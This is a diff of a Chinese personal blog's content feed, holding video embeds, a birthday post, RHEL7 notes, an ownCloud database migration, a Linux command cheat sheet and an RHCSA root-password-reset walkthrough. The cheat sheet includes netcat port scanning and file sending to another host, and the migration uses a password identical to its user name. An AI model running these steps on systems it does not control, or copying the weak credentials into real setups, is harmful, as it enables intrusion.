+        <content type="html"><![CDATA[<p></p><h1>简介</h1><br>    故事讲述的是Eric、Pat、JoJo、龙、Bill、Ken、岚七人本去前往离岛露营，但怎料碰上狂风暴雨，七人遂来到一间空屋暂避。可是没想到意外却发生了，就在当天晚上，古怪的事情接二连三发生。JoJo 联同Bill 及Ken 捉弄龙，令龙无地自容，结果龙更被魔力扯进镜内……<br>    翌日，众人商议再停留多玩乐一天，怎料Ken 竟失踪，Bill、JoJo 先后被杀，令Eric 不寒而栗……<br><a id="more"></a><p></p><p></p><h2>正片 猛鬼屠房</h2><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer11" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer11"),"video":{"url":"https://cdn.kuyunbo.club/20190422/19588_3ed61841/1000k/hls/index.m3u8"},"danmaku":{"api":"//dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 电影收藏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>zhenhunjie</title>
+      <link href="/2019/08/06/zhenhunjie/"/>
+      <url>/2019/08/06/zhenhunjie/</url>
+      
+        <content type="html"><![CDATA[<p></p><h2>镇魂街简介</h2><br><a id="more"></a><br><div style="position: relative; width: 100%;height: 0;padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=5098406&cid=8282083&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%;height: 100%; left: 0; top: 0;"> </iframe></div><p></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>baisheyuanqi</title>
+      <link href="/2019/08/04/baisheyuanqi/"/>
+      <url>/2019/08/04/baisheyuanqi/</url>
+      
+        <content type="html"><![CDATA[<hr><p></p><h1>简介</h1><br>    晚唐年间，国师发动民众大量捕蛇。前去刺杀国师的白蛇意外失忆，被捕蛇村少年救下。<br>    为帮助少女找回记忆，两人踏上一段冒险旅程，冒险的过程让两人感情迅速升温，但少女蛇妖的身份也逐渐显露，<br>    另一边国师与蛇族之间不可避免的大战也即将打响，两人的爱情将要接受巨大考验。<p></p><p></p><h2>正片 白蛇：缘起</h2><p></p><p><script type="text/javascript" src="/assets/js/hls.min.js"></script><br><div id="dplayer1" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer1"),"video":{"url":"https://leshi.iqiyi-kuyunzy.com/20190303/3992_50164f35/800k/hls/index.m3u8"},"danmaku":{"api":"http://dplayer.daoapp.io","token":"tokendemo"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>birthday</title>
+      <link href="/2019/07/31/birthday/"/>
+      <url>/2019/07/31/birthday/</url>
+      
+        <content type="html"><![CDATA[<hr><p>HAPPY BIRTHDAY TO 五花肉<br>DAY：7月31<br>  有个漂亮的小女孩我们都叫她五花肉，因为她皮肤表面细致，富有弹性稍微捏、按肉质弹性佳，不油不涩，口感恰到好处！</p><p>  今天是你的生日，愿所有的快乐所有的幸福所有的温馨所有的好运围绕在你身边。生日快乐！</p><p>  <img src="/2019/07/31/birthday/birthday.png" alt=""></p>  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=27570622&auto=0&height=66"></iframe>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 生活 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>test</title>
+      <link href="/2019/07/23/test/"/>
+      <url>/2019/07/23/test/</url>
+      
+        <content type="html"><![CDATA[<hr><p>五花肉的故事<br>  作为躺在砧板上的肉肉，不知从何时起已经忘记了它本来来到这个世界的初衷。<br>  此时的它一脸茫然得望着来来往往的人，一副我在哪，我是谁，我来自哪里？的模样。<br>  忽然。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> something wrong </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>rhel7_specific</title>
+      <link href="/2019/06/15/rhel7-specific/"/>
+      <url>/2019/06/15/rhel7-specific/</url>
+      
+        <content type="html"><![CDATA[<p>RHEL7新特性详解</p><pre><code>1，  首先RHEL7仅可用在以下平台：  64bit AMD ,  64bit Intel,   IBM Power, IBM System z系统，新版本的RHEL不再支持32bit架构了。2， GRUB2 比之前的GRUB更强大，支持BIOS，EFI和OpenFiremware ,支持MBR分区表和GPT分区表，还支持非Linux系统如NTFS等。3， 传统的文件系统是ext3, ext4,而RHEL7默认文件系统是XFS， 它支持在线调整大小。4， RHEL7支持多种安装方式，CDROM, ISO, PXE, USB</code></pre><a id="more"></a> <pre><code>一、systemd 服务管理和系统管理程序，提供了并行处理的能力。尽可能启动更少的进程，让进程并行启动，并实现按需启动。二、一个服务并认为是一个配置单元，可用的配置单元如下--service  #代表一个后台服务--socket   #代表一个套接字--device   #代表一个设备--mount    #代表一个挂载点--automount #代表一个自挂载点--swap      #交换配置单元用来管理交换分区--target    #此类配置单元为其他配置单元进行逻辑组合，它们本身实际上并不做什么，只是引用其他配置单元而已--timer     #定时器配置单元用来定时触发用户定义的操作，这类配置单元取代了atd、crond等传统的定时服务--snapshot  #与target配置单元相似，快照是一组配置单元，它保存了系统当前的运行状态</code></pre><p>服务管理工具对比，以下是RHEL6与RHEL7命令对比。</p><pre><code>传统工具                    新工具                                描述service name start        systemctl start name.service       启动服务service name stop         systemctl stop  name.service       关闭服务service name restart      systemctl restart name.service     重启服务service name reload       systemctl reload  name.service     重新加载配置文件service name status       systemctl status  name.service     查看状态service --status-all      systemctl list-units--type service --all 查看所有服务状态chkconfig name on         systemctl enable name.service      开机启动chkconfig name off        systemctl disable name.service     开机禁止chkconfig --list name     systemctl status name.service      查看状态                          systemctl is-enabled name.service chkconfig --list          systemctl list-units --type service 列出所有服务状态</code></pre><p>开机运行级别和切换运行级别，RHEL7取消了运行级别功能，取而代之的是Target Units，Target是其它systemd单元的逻辑集合。</p><pre><code>RHEL6级别    RHEL7 Target Units                        描述   0          poweroff.target                          关机   1          rescue.target                          救援模式   2          multi-user.target                      多用户模式   3          multi-user.target                      多用户模式   4          multi-user.target                      多用户模式   5          graphical.target                       图形模式   6          reboot.target                          重启 runlevel     systemctl list-units --type target     查看当前加载的单元 telinitN     systemctl isolate name.target          切换Target Unit              systemctl get-default                  查看默认Target Unit              systemctl set-default name.target      修改默认Target Unit  其他的操纵模式  《1》救援模式  systemctl rescue  《2》应急模式  systemctl emergency</code></pre><p>电源管理RHEL6与RHEL7命令对比。</p><pre><code>RHEL6         RHEL7                         描述halt         systemctl halt                 关机reboot       systemctl reboot               重启pm-suspend   systemctl suspend              暂停系统（保持系统状态到内存）pm-hibernate systemctl hibernate            系统休眠（保持系统状态到硬盘）</code></pre><p>操控远程主机systemctl工具支持远程控制，该功能依赖于SSH协议，</p><p>格式：   systemctl -H user@hostname  command</p><p>以下©著作权归作者所有：来自51CTO博客作者大Q小Q的原创作品，如需转载，请注明出处，否则将追究法律责任<br>一、RHEL7新特性对比之安装</p><pre><code>2012，发布rhel7（主要是64位系统）1、RHEL7目前支持架构：①64-bit AMD    ②64-bit Intel    ③IBM POWER    ④IBM System z    ⑤不再支持x86 32bit2、RHEL7安装界面--&gt;grub2,systemd①全新的安装界面    ②一站式的安装配置    ③全新的kickstart结构    ④全新的分区工具⑤支持2TB以上硬盘作为系统引导盘    ⑥安装配置步骤较大变化3、RHEL7的分区/boot   ---启动分区200Mswap    ---交换分区2048M/          ---根分区（自定义）4、安装类型：Server  with  GUI 。5、UID①rhel7的普通用户UID从1000开始；②rhel6的普通用户UID从500开始 。6、RHEL7启动引导工具①全新的Grub2引导工具②支持包括PowerPC在内的CPU架构③支持BIOS、EFI和OpenFireware的基础输入/输出系统架构④支持MBR方式的2TB以内容量硬盘和GPT方式2TB以上容量硬盘⑤支持从非Linux文件系统引导，例如HFS+和NTFS7、桌面 rhel7：①使用最新的Gnome 3为默认桌面环境    ②使用最新的KDE 4.10为备选桌面环境 rhel6：①使用Gnome 2为默认桌面环境               ②使用KDE 3 为备选桌面环境8、RHEL7存储子系统①内核支持iscsi、FCoE和iSER②使用内核LIO target subsystem替换了rhel6中的tgtd第三方服务③LVM升级支持RAID方式，替换了rhel6中的mdadm工具，软RAID功能由卷管理方式实现④更新更多的HBA卡支持9、RHEL7文件系统 ①系统主目录“/”文件系统默认为XFS（xfs的扩展性、容量、安全性都比ext4更强） ②支持Btrfs文件系统作为前瞻技术预览，但不推荐不做商业支持 ③更好的支持SSD，普通硬盘默认调度算法为CFQ，SSD硬盘默认设置为Deadline</code></pre><p>二、RHEL7新特性对比之内核与虚拟化</p><pre><code>1、RHEL7内核（查看内核的命令：uname -a）①内核版本为3.10②支持动态补丁机制kpatch作为技术预览③内核出错后导出core文件支持最大3TB④支持内核模块黑名单机制（modprode.blacklist=module）⑤支持嵌套虚拟化技术、虚拟CPU更顺畅⑥内核级支持资源的调优和分配</code></pre><p>2、RHEL7虚拟化支持</p><pre><code>①更高性能的KVM内核虚拟化支持②虚拟机USB3.0接口支持③更方便更稳定的动态迁移支持④QCOW2格式文件型快照支持⑤嵌套虚拟化支持，可以在KVM中安装配置OpenStack⑥继续支持作为虚拟机的Xen技术，但不再支持作为寄主机的Xen技术⑦加强了对VMWARE的技术支持，自带open-vm-tools替换vm-tools</code></pre><p>3、RHEL7容器型虚拟化</p><pre><code>①支持LXC容器型虚拟化②支持最热的技术Docker③提供最新rhel7的Docker p_w_picpath④支持自建Docker Register</code></pre><p>三、RHEL7新特性对比之启动工具</p><pre><code>RHEL 7 系统及服务启动控制①全新的系统及服务启动管理器-Systemd②全新的系统及服务启动管理命令-systemctlrhel6 ---&gt;chkconfig --listrhel7 ---&gt;systemctl list-unitschkconfig  ---&gt;  systemctlsystemctl enable autofs  --&gt; chkconfig autofs onmask--&gt;被标记的服务状态不能被改变。umask--&gt;删除标记，状态被释放。</code></pre><p>四、RHEL7新特性对比之编译工具</p><pre><code>1、RHEL 7编译器及工具①使用GCC4.8 作为默认编译工具（yum list gcc查看）②使用Glibc 2.17 作为标准库（yum list glibc查看）③使用GDB 7.6.1 作为编译调试工具（yum list gdb查看）④支持Ruby 2.0（yum list ruby查看）⑤支持Python 2.7.5（yum list python查看）⑥支持Java 7（yum list *java*查看）</code></pre><p>五、RHEL7新特性对比之网络配置</p><pre><code>1、RHEL 7 网络配置①迁移原有的网络配置工具到全新的NetworkManager（ifconfig--&gt;systemctl status NetworkManager--&gt;nmcli connection show --&gt;nmtui--&gt;nm-connection-editor）②支持全新的网络聚合模式Team（Team和Bond是一样的功能，Team采用新的技术，Bond是旧技术）③使用Chrony服务替换原有的NTPd服务（rhel7的chronyd支持微妙级systemctl status chronyd；rhel6的ntpd支持毫秒级chkconfig --list ntpd）④全新的Firewalld防火墙工具（rhel7:iptables -L --&gt;systemctl status iptables --&gt; systemctl status firewalld--&gt;firewall-config防火墙配置的图形化界面）（rhel6:iptables -L --&gt;service iptables status）⑥支持网络名字空间方便容器型虚拟机管理</code></pre><p>六、RHEL7新特性对比之认证与跟新</p><pre><code>2、RHEL 7服务版本更新①使用Apache 2.4替换之前的Apache2.2（yum list httpd查看）②使用MariaDB 5.5替换之前的MySQL5.1（yum list mysql*|mariadb*）</code></pre><p>七、RHEL7新特性对比总结</p><pre><code>1、rhel7对于开发人员最大的变化是内核升级到3.102、rhel7对于系统管理人员最大的变化是系统及服务管理程序修改为Systemd3、rhel7对于网络运维人员最大的变化是网络管理程序和服务修改为NetworkManager4、rhel7对于存储工程师最大的变化是iSCSI导出服务修改为LIO kernel Target Subsystem5、rhel7对于云计算工程师最大的喜讯是原生的支持KVM嵌套虚拟化和Docker容器虚拟化</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>owncloud</title>
+      <link href="/2019/05/28/owncloud/"/>
+      <url>/2019/05/28/owncloud/</url>
+      
+        <content type="html"><![CDATA[<hr><p>owncloud 数据库从SQLite 迁移到MySQL/MariaDB遇到的坑</p><pre><code>1. 查看配置文件config.php，找到字符&apos;dbtype&apos;=&gt;&apos;sqlite3&apos;证明数据库类型为SQLite2. 修改配置文件config.php   备注：本文的配置文件路径/var/www/html/owncloud/config/config.php   修改配置文件config.php，将installed那行改为：&apos;installed&apos; =&gt; false,3. 新建MySQL数据库注：这里就是我自己入的坑了，我利用PHPmyadmin登录进去，新建一个用户并建一个同名的数据库，设置密码后，授权所有权限。设置完后，访问owncloud 安装页面，重新配置OWNCLOUD管理员用户，配置数据库。提交后出现mysql：ERROR 1045 (28000): Access denied for user &apos;owncloud@&apos;localhost&apos; (using password: YES)错误！然后用SHELL命令进去mysql #mysql -u root -p#select user,password from mysql.user;  //查看数据库账号和密码//发现新建的owncloud没有设置密码，好，手动再设置密码。设置完毕后再次提交，显示还是一样的错误。/*好小子，我就把这个账号删除了！重新来过！*/#mysql -uroot -p //进去mysqlMySQL&gt; create database owncloud;  //新建数据库owncloudQuery OK, 1 row affected (0.00 sec)MySQL&gt; CREATE USER &apos;owncloud&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;owncloud&apos;; //新建数据库用户owncloud,密码owncloudQuery OK, 0 rows affected (0.00 sec)MySQL&gt; GRANT ALL PRIVILEGES ON owncloud.* TO &apos;owncloud&apos;@&apos;localhost&apos;; //分配用户权限Query OK, 0 rows affected (0.00 sec)MySQL&gt; FLUSH PRIVILEGES;   //刷新用户权限Query OK, 0 rows affected (0.00 sec)4. 重新创建owncloud管理员用户，配置数据库浏览器访问 localhost/owncloud/，重新配置数据库</code></pre><p>   1st.管理员用户和密码填写用SQLite时配置的那个一样<br>   2nd.文件夹采用默认<br>   3rd.配置数据库 选择MySQL并根据你的数据库填写下面四栏信息<br>   备注：owncloud<br>         owncloud<br>         owncloud<br>         localhost<br>填写完毕后提交，居然安装成功了！！！！我也一脸懵逼啊，为啥之前是使用PHPmyadmin建的数据库和账号不可以呢？还是权限没设置对！！！</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> something wrong </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Recruit marriage</title>
+      <link href="/2019/05/03/Recruit-marriage/"/>
+      <url>/2019/05/03/Recruit-marriage/</url>
+      
+        <content type="html"><![CDATA[<p>Men Seeking Women</p><pre><code>Full name:A jealous boyAge：Last year eighteenOccupation：I lost my job when the company moved to another stateA partner in marriage：a girlI think everything we do should use our hearts. Once you fully open the heart for someone,please carefull and patiently love her.</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 生活 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pdf-upload-test</title>
+      <link href="/2019/03/17/pdf-upload-test/"/>
+      <url>/2019/03/17/pdf-upload-test/</url>
+      
+        <content type="html"><![CDATA[<p><center>upload-pdf-test<center></center></center></p><p><br><br><div class="row">    <embed src="/2019/03/17/pdf-upload-test/Red-Hat-Enterprise-Linux-7-Global-File-System-2-en-US.pdf" width="100%" height="550" type="application/pdf"></div><br><br></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>instructions-for-linux</title>
+      <link href="/2019/03/16/instructions-for-linux/"/>
+      <url>/2019/03/16/instructions-for-linux/</url>
+      
+        <content type="html"><![CDATA[<hr><p>Linux系统需要定期巡检，以检查服务器软硬件使用情况，相当于对人的体检，确保可以及时发现问题、解决问题，降低损失，常用的巡检命令如下：<br><a id="more"></a></p><pre><code># uname -a # 查看内核/操作系统/CPU信息# head -n 1 /etc/issue # 查看操作系统版本# cat /proc/cpuinfo # 查看CPU信息# hostname # 查看计算机名# lspci -tv # 列出所有PCI设备# lsusb -tv # 列出所有USB设备# lsmod # 列出加载的内核模块# env # 查看环境变量# free -m # 查看内存使用量和交换区使用量# df -h # 查看各分区使用情况# du -sh &lt; 目录名&gt; # 查看指定目录的大小# grep MemTotal /proc/meminfo # 查看内存总量# grep MemFree /proc/meminfo # 查看空闲内存量# uptime # 查看系统运行时间、用户数、负载# cat /proc/loadavg # 查看系统负载# mount | column -t # 查看挂接的分区状态# fdisk -l # 查看所有分区# swapon -s # 查看所有交换分区# hdparm -i /dev/hda # 查看磁盘参数(仅适用于IDE设备)# dmesg | grep IDE # 查看启动时IDE设备检测状况# ifconfig # 查看所有网络接口的属性# iptables -L # 查看防火墙设置# netstat -lntp # 查看所有监听端口# netstat -antp # 查看所有已经建立的连接# netstat -s # 查看网络统计信息# ps -ef # 查看所有进程# top # 实时显示进程状态# w # 查看活动用户# id &lt; 用户名&gt; # 查看指定用户信息# last # 查看用户登录日志# cut -d: -f1 /etc/passwd # 查看系统所有用户# cut -d: -f1 /etc/group # 查看系统所有组# crontab -l # 查看所有用户的定时任务</code></pre><!--more--><p>Linux系统需要别的机器访问自己，或者去访问别的机器，这就需要设置一些网络配置，常用命令如下：</p><p>IP命令</p><pre><code># ip addr show eth0 #查看eth0接口IP# ip link set dev eth0 up      #up/down 起动／关闭设备# ip link set dev eth0 txqueuelen 100      #改变设备传输队列的长度# ip link set dev eth0 mtu 1500      #改变网络设备MTU(最大传输单元)的值# ip link set dev eth0 address 00:01:4f:00:15:f1      #修改网络设备的MAC地址# ip -s -s link ls eth0      #查看eth0网卡信息 等同于ifconfig eth0# ip addr add local 192.168.4.1/28 brd + label eth0:1 dev eth0    #为每个地址设置一个字符串作为标签# ip addr add 192.168.4.2/24 brd + dev eth1 label eth1:1   #在以太网接口eth0上增加一个地址192.168.4.2，掩码长度为24位(155.155.155.0)，标准广播地址，标签为eth0:Alias# ip addr del 192.168.4.1/24 brd + dev eth0 label eth0:1      #ip address delete--删除一个协议地址. 缩写：delete、del、d# ip addr ls eth0      #ip address show--显示协议地址. 缩写：show、list、lst、sh、ls、l# ip -s -s a f to 10/8      #删除属于私网10.0.0.0/8的所有地址# ip -4 addr flush label &quot;eth0&quot;      #取消所有以太网卡的IP地址# ip neigh add 10.0.0.3 lladdr 0:0:0:0:0:1 dev eth0 nud perm      #在设备eth0上，为地址10.0.0.3添加一个permanent ARP条目# ip neigh chg 10.0.0.3 dev eth0 nud reachable      #把状态改为reachable# ip neigh del 10.0.0.3 dev eth0      #删除设备eth0上的一个ARP条目10.0.0.3# ip route add 192.168.10.0/24 dev eth1    #添加192.168.10.0/24网段转发到eth1# ip ro  #打印本地路由</code></pre><p>route命令</p><pre><code># route    #显示当前路由# route del default gw 192.168.0.1  #删除默认网关# route add default gw 192.168.0.1  #添加默认网关# route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0   #增加一条路由# route add -net 224.0.0.0 netmask 240.0.0.0 reject   #屏蔽一条路由# route add -host 192.168.0.2 gw 192.168.0.1   #所有去往192.168.0.2主机的数据包发往网关地址192.168.0.1# route add -host 10.1.6.18  dev lo:0   #所有去往主机10.1.6.18的路由都通过设备lo:0# route -n #查看路由表</code></pre><p>tracepath&amp;traceroute</p><pre><code># tracepath access.redhat.com #用来追踪连接到目标地址的所经过的路由</code></pre><p>netstat命令</p><pre><code># netstat -a    #列出所有端口# netstat -at   #列出所有TCP端口# netstat -au   #列出所有UDP端口# netstat -r    #显示核心路由信息# netstat -i    #显示网络接口列表# netstat -tpnl #显看已连接的TCP端口，以及PID# netstat -nat | grep“192.168.1.15:22”| awk&apos;{print $ 5}&apos;| awk -F：&apos;{print $ 1}&apos;| sort | uniq -c | sort -nr | head -20 #查看连接某服务端口最多的的IP地址# netstat -anp | grep 3306 -c     ＃查看3306端口（mysql）的链接数# netstat -alp | grep 8080        ＃找出运行在指定端口的进程</code></pre><p>nmcli命令</p><pre><code># nmcli connection show           # 查看当前连接状态# nmcli connection reload         # 重启服务# nmcli connection show -active   # 显示活动的连接# nmcli connection show &quot;lan eth0&quot; # 显示指定一个网络连接配置# nmcli device status             # 显示设备状态# nmcli device show eno16777736   # 显示指定接口属性# nmcli device show               # 显示全部接口属性# nmcli con up static             # 启用static连接配置# nmcli con up default            # 启用default连接配置 # nmcli con add help              # 查看帮助</code></pre><p>firewall-cmd命令</p><pre><code># firewall-cmd --list-all-zones    #查看所有的zone信息# firewall-cmd --get-default-zone     #查看默认zone是哪一个# firewall-cmd --zone=internal --change-zone=p3p1  #临时修改接口p3p1所属的zone为internal# firewall-cmd --add-service=http    #暂时开放http# firewall-cmd --permanent --add-service=http  #永久开放http# firewall-cmd --zone=public --add-port=80/tcp --permanent  #在public中永久开放80端口# firewall-cmd --permanent --zone=public --remove-service=ssh   #从public zone中移除服务# firewall-cmd --reload   #重新加载配置# firewall-cmd --zone=public --add-port=80/tcp --permanent    #开放80 端口  命令含义：  --zone #作用域  --add-port=80/tcp  #添加端口，格式为：端口/通讯协议  --permanent   #永久生效，没有此参数重启后失效1,查看 firewall  状态 :  $ firewall-cmd --state   # eg :running2,查看 firewall 版本 : $ firewall-cmd --version #eg : 0.4.3.2</code></pre><p>tcpdump命令</p><pre><code># tcpdump -i eth1                           #监视指定网络接口的数据包# tcpdump host webserver                    #打印所有进入或离开webserver的数据包.# tcpdump host 210.27.48.1                  #也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包# tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \)       #截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信# tcpdump ip host 210.27.48.1 and ! 210.27.48.2     #获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包# tcpdump -i eth0 src host webserver        #截获主机webserver发送的所有数据# tcpdump -i eth0 dst host webserver        #监视所有送到主机webserver的数据包# tcpdump tcp port 23 and host 210.27.48.1       #获取主机210.27.48.1接收或发出的telnet包# tcpdump udp port 123                       #对本机的udp 123 端口进行监视 123 为ntp的服务端口# tcpdump ip and not net localnet       #打印所有源地址或目标地址是本地主机的IP数据包# tcpdump &apos;gateway snup and ip[2:2] &gt; 576&apos;        #打印长度超过576字节, 并且网关地址是snup的IP数据包# tcpdump &apos;ether[0] &amp; 1 = 0 and ip[16] &gt;= 224&apos;        #打印所有IP层广播或多播的数据包， 但不是物理以太网层的广播或多播数据报# tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854        #使用tcpdump抓取HTTP包# tcpdump &apos;tcp[tcpflags] &amp; (tcp-syn|tcp-fin) != 0 and not src and dst net localnet&apos;       #打印TCP会话中的的开始和结束数据包, 并且数据包的源或目的不是本地网络上的主机.(nt: localnet, 实际使用时要真正替换成本地网络的名字))# tcpdump &apos;tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2 -=&quot;&quot; tcp=&quot;&quot; 12=&quot;&quot; 0xf0=&quot;&quot;&gt;&gt;2)) != 0)&apos;     #打印所有源或目的端口是80, 网络层协议为IPv4, 并且含有数据,而不是SYN,FIN以及ACK-only等不含数据的数据包# tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap#(1)tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型#(2)-i eth1 : 只抓经过接口eth1的包#(3)-t : 不显示时间戳#(4)-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包#(5)-c 100 : 只抓取100个数据包#(6)dst port ! 22 : 不抓取目标端口是22的数据包#(7)src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24#(8)-w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析</code></pre><p>nc命令</p><pre><code># nc -v -w 2 192.168.1.34 -z 21-24  #端口扫描上传文件# nc -l 1234 &gt; test.txt# nc 192.168.x.x &lt; test.txt# nc -p 1234 -w 5 blog.51yip.com 80 #建立从本地1234端口到host.example.com的80端口连接，5秒超时# nc -u 192.168.1.102 53   #udp连接# nc blog.51yip.com 80     #模拟HTTP Headers</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RHEL7题库</title>
+      <link href="/2018/09/09/RHEL7%E9%A2%98%E5%BA%93/"/>
+      <url>/2018/09/09/RHEL7%E9%A2%98%E5%BA%93/</url>
+      
+        <content type="html"><![CDATA[<p>RHCSA题库答案<br>    题目0 破解密码<br>    A 重置虚拟机的Root 密码，设置为redhat。<br>    B 设置 system1 的网络和主机名<br>    你的虚拟机的网络应该按照以下要求配置：</p><pre><code>*    Hostname:desktopX.example.com*    IP address:172.25.x.10*    Netmask:255.255.255.0*    Gateway:172.25.x.254*     Name server:172.25.254.254</code></pre><a id="more"></a><pre><code>参考步骤破解密码：(1)开机，快速的按上下键，选择第一个(2)按下字母e(3)找到linux16开头的行(4)到该行的最后，删除到ro(5)把ro 改成 rw rd.break(6)ctrl+x      (7)chroot /sysroot/(8)这时就可以修改root密码了 passwd root (9) SElinux开启时必须需要创建，重打selinux标签，如果没这步，系统起不来 touch /.autorelabel (10)exit (11)reboot 网络和主机名： (1)hostnamectl set-hostname desktopX.example.com (2)vim /etc/sysconfig/network-scripts/ifcfg-eth0  DEVICE=eth0 BOOTPROTO=none ONBOOT=yes TYPE=Ethernet IPADDR1=172.25.0.10 PREFIX1=24 GATEWAY1=172.25.0.254 DNS1=172.25.254.254 (3)systemctl restart network</code></pre><p>模拟考试环境<br>下面我们模拟考试环境，破解desktop0的密码。<br>破解密码：<br>(1)开机，快速的按上下键，选择第一个<br><img src="/2018/09/09/RHEL7题库/1.jpg" alt="如图"><br>(2)按下字母e<br>(3)找到linux16开头的行<br><img src="/2018/09/09/RHEL7题库/2.jpg" alt="如图"><br>(4)到该行的最后，删除到ro<br>(5)把ro 改成 rw rd.break<br>(6)ctrl+x<br>(7)chroot /sysroot/,这里将文件系统切换到真正的根上面，可以看到提示符变成了“sh-4.2#”。<br><img src="/2018/09/09/RHEL7题库/3.jpg" alt="如图"><br>(8)这时就可以修改root密码了<br>passwd root<br><img src="/2018/09/09/RHEL7题库/4.jpg" alt="如图"><br>(9)重打selinux标签，如果没这步，系统起不来<br>touch /.autorelabel<br>(10)exit<br>(11)reboot<br><img src="/2018/09/09/RHEL7题库/5.jpg" alt="如图"><br>在实验环境中虚拟机是以DHCP的方式获得IP的，因此在本实验环境通过下面方法来修改IP。在考试中需要看清楚题目的要求的IP和网关和DNS，然后再修改网络配置，评分时会登陆你的虚拟机，IP不对将无法评分。<br>(1)ip addr show       #查看IP地址与子网掩码并记录下来<br>(2)route              #查看网关并记录下来<br>(3)cat /etc/resolv.conf   #查看DNS并记录下来<br>(4)hostname           #查看主机名<br><img src="/2018/09/09/RHEL7题库/6.jpg" alt="如图"><br>(5)然后写到配置文件中<br>vim /etc/sysconfig/network-scripts/ifcfg-eth0<br>DEVICE=eth0<br>BOOTPROTO=none<br>ONBOOT=yes<br>TYPE=Ethernet<br>IPADDR1=172.25.0.10<br>PREFIX1=24<br>GATEWAY1=172.25.0.254<br>DNS1=172.25.254.254<br>(6)重启网络<br>systemctl restart network</p><p>注意事项<br>(1)    这题做成功没分，没做成功全部为0分。<br>(2)    这里改密码后要记得touch /.autorelabel，这里单词经常有同学写错的哈。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cp</title>
+      <link href="/2018/08/14/cp/"/>
+      <url>/2018/08/14/cp/</url>
+      
+        <content type="html"><![CDATA[<hr><p>使用VIM时，鼠标右键不能粘贴而是进入VISUAL模式。网上查找一番找到了解决方法：<br>方法一：在普通模式下键入</p><pre><code>set mouse-=a</code></pre><p>方法二：编辑~/.vimrc 文件，加入如下代码：</p><pre><code>if has(&apos;mouse&apos;)set mouse-=a endif</code></pre><p>方法一每次打开VIM时都需要设置一次。方法二改了配置文件后，问题就解决了。参考：<br><a href="http://www.varesano.net/blog/fabio/disable%20vim%20automatic%20visual%20mode%20using%20mouse" target="_blank" rel="noopener">www.varesano.net/blog/fabio/disable%20vim%20automatic%20visual%20mode%20using%20mouse</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> something wrong </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>newlinux</title>
+      <link href="/2018/08/13/newlinux/"/>
+      <url>/2018/08/13/newlinux/</url>
+      
